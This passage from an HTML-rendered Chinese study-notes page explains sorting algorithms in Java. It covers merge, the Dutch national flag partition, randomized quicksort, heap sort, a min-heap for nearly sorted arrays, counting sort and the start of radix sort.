punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">L</span><span class="token punctuation">,</span> <span class="token keyword">int</span> mid<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> p1 <span class="token operator">=</span> <span class="token class-name">L</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> p2 <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> help <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">R</span><span class="token operator">-</span><span class="token class-name">L</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p1<span class="token operator">&lt;=</span>mid<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>p2<span class="token operator">&lt;=</span><span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        help<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>p1<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>p2<span class="token punctuation">]</span> <span class="token operator">?</span> arr<span class="token punctuation">[</span>p1<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">:</span> arr<span class="token punctuation">[</span>p2<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p1<span class="token operator">&lt;=</span>mid<span class="token punctuation">)</span> help<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>p1<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p2<span class="token operator">&lt;=</span><span class="token class-name">R</span><span class="token punctuation">)</span> help<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>p2<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token class-name">R</span><span class="token operator">-</span><span class="token class-name">L</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span><span class="token class-name">L</span><span class="token operator">+</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> help<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="荷兰国旗问题（快排引子）"><a href="#荷兰国旗问题（快排引子）" class="headerlink" title="荷兰国旗问题（快排引子）"></a>荷兰国旗问题（快排引子）</h2><h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h3><p>数组arr, 数num, 把小于等于num的数放在数组的左边，大于num的放在右边，要求空间复杂度O(1), 时间复杂度O(N)</p><blockquote><p>0, 1, 2, …, i, i+1, …, length-1</p><p>从头开启一个区域为小于等于num的区域，开始遍历</p><p>1）该数&lt;=num，则与区域的下一个数交换，区域++，i++</p><p>2）&gt;num，则i++</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">DutchFlagOne</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> lessEqualArea <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> num<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">++</span>lessEqualArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h3><p>小于num的数放在数组的左边，等于num的放在中间，大于num的放在右边，要求空间复杂度O(1), 时间复杂度O(N)</p><blockquote><p>0, 1, 2, …, i, i+1, …, length-1</p><p>从头开启一个区域为小于num的区域，从尾开启大于num的区域，开始遍历</p><p>1）该数&lt;num，则与区域的下一个数交换，区域++，i++</p><p>2）==num，则i++</p><p>3）&gt;num，则与大于的区域的前一个数交换，区域–，i++</p><p>注意结束条件</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">DutchFlagTwo</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> lessArea <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> moreArea <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>moreArea<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> num<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token operator">++</span><span class="token punctuation">,</span> <span class="token operator">++</span>lessArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> num<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">--</span>moreArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p>0, 1, 2, …, i, i+1, …, length-1</p><h3 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h3><p>选择数组最后一个数为荷兰国旗问题中的num，将小于num的放在左侧，大于num的放在右侧，然后将num与大于num区域的最左侧的数交换，（…）num（…），再继续递归，对小于的区域和大于的区域进行同样的操作，即选最后一个数为num，…</p><h3 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h3><p>这次是分为三块，即小于，等于，大于</p><blockquote><p>对于1.0和2.0都存在极端情况为O(n2)，即数组已经排好序的情况</p></blockquote><h3 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h3><p>不选最后一个数为num，而是完全随机地选出数组中的某个数作为num，然后与最后一个数做交换，这样又回到了2.0的情况，这样保证了复杂度为O(n*logn)，一定不要忘记分完区域之后，将最后一个数与大于num区域最左侧的数交换</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">quickSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">quickSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> l <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>r <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> num<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> p <span class="token operator">=</span> <span class="token function">partition</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//返回等于num的区域的左边界和右边界</span>        <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">partition</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> lessArea <span class="token operator">=</span> l<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> moreArea <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>l<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>moreArea<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token operator">++</span><span class="token punctuation">,</span> <span class="token operator">++</span>lessArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">--</span>moreArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> moreArea<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>lessArea<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>moreArea<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><p>大根堆 - 以该节点为根节点的子树 最大值为该节点  即为大根堆</p><p>左孩子：i*2+1，右孩子：i*2+2，父：(i-1)/2</p><p><code>heapInsert</code>方法：往堆中插入一个数，使其继续满足大根堆</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">heapInsert</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>        index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>heapify</code>方法：将index处的数取出，使其继续满足大根堆</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> index <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left <span class="token operator">&lt;</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> largest <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> heapSize<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> left <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> left<span class="token punctuation">;</span>        largest <span class="token operator">=</span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">?</span> largest <span class="token operator">:</span> index<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>largest <span class="token operator">==</span> index<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> largest<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>        index <span class="token operator">=</span> largest<span class="token punctuation">;</span>        left <span class="token operator">=</span> index <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>堆排序即从头开始，heapsize=0，使0-0为大根堆，0-1为大根堆，直至0-arr.length-1为大根堆，此时heapsize=arr.length，然后将大根堆最大值即arr[0]与最后一个数交换，然后heapsize–，同时做<code>heapify</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">heapSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">heapInsert</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> heapSize <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>heapSize <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token operator">--</span>heapSize<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="小根堆的应用"><a href="#小根堆的应用" class="headerlink" title="小根堆的应用"></a>小根堆的应用</h2><p>已知一个几乎有序的数组，几乎有序是指，如果把数组排好顺序的话，每个元素移动的距离可以不超过k，并且k相对于数组来说比较小。请选择一个合适的排序算法针对这个数据进行排序</p><p>0, 1, 2, …, i, i+1, …, length-1</p><p>先取前k+1个数，0, 1, …, k，将这些数变为小根堆，那么0位置上的数一定为整个数组的最小值，因为移动距离不超过k，所以将该小根堆最小值放在第0位置即可，然后将k+1加入小根堆，弹出该小根堆最小值，放在第1位置，依次往后，到最后k+1个数，一一弹出即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">smallRootHeap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> heap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> heap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        heap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>heap<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h2><p>不基于比较的排序，需要样本数据状况满足桶的划分，时间复杂度O(n)</p><h3 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h3><p>对一个值在0-200内的整数数组进行排序，设立辅助数组（size为该数组的最大值），然后遍历数组，值即为辅助数组下标，使其++，所以辅助数组相当于计数器，遍历完之后，从小到大输出</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">countSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> each<span class="token operator">:</span>arr<span class="token punctuation">)</span> <span class="token keyword">if</span><span class="token punctuation">(</span>max <span class="token operator">&lt;</span> each<span class="token punctuation">)</span> max <span class="token operator">=</span> each<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bucket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>max<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> each<span class="token operator">:</span>arr<span class="token punctuation">)</span> bucket<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><p>该排序只适用于有进制的数据，即十进制用十个桶，三进制用3个桶等</p><p>对于十进制数据，准备size为10的辅助数组，然后遍历待排序的数组，从个位开始，个位为1的放到辅助数组[1]中，依次遍历，然后再取出，这十个桶需要满足队列性质，即先进的先出，然后再对十位，百位进行同样的入桶出桶操作，最后出来的即为有序</p><p><strong>优化版的算法</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">radixSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token 